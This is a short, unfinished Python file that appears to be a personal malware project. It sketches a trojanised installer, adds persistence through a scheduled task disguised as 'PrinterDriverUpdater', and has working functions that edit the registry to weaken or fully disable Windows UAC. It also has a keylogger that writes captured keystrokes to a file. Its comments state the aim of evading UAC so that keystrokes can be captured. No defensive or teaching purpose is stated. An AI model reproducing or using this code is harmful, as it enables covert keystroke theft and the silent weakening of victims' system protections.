from os import system, getlogin
from subprocess import run
from keyboard import record
from timeit import sleep
from inspect import getsource

scheduler = "schtasks /create /TN PrinterDriverUpdater /XML C:/Users/lhill23/Documents/GitHub/system-logger/PrinterDriverUpdater.xml"

#Hijacking task scheduler, kinda?
def PoisonBottle(installer, opencmd, cmddelay, UACdowngrade, UACdisable):
    #Create .exe identical to installer, but with fake elevation then execution stuff
    poison = open("poison.py", 'w')
    include = ""
    if(1):
        include += getsource(DowngradeUAC)
    if(1):
        include += getsource(DisableUAC)
    

    #system("pyinstaller -F --name Poison -i " + installer + "jacker.py") 


def DowngradeUAC():
    #Stop UAC opening on secure desktop, allowing for software keylogger
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v PromptOnSecureDesktop /t REG_DWORD /d 0")

def DisableUAC():
    #Straight disable UAC
    system("reg add HKLM/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/System /f /v EnableLUA /t REG_DWORD /d 0")

#Applications infact do not get left alone by UAC if launched as admin. Screw you dude on stack overflow thread from 7 years ago, its you and not 7 years
def Log():
    #Start a keylogger
    output = open(('C:/Users/' + str(getlogin()) + '/Desktop/log.txt'), 'w') # TODO getlogin might retun the user who elevated it
    r = record(until='`')
    r = str(r)
    r = r.replace("KeyboardEvent(", '')
    r = r.replace(',', '')
    r = r.replace("down)", ',')
    r = r.replace("up)", '\'')
    output.write(r)

#Drivers?


if __name__ == "__main__":
    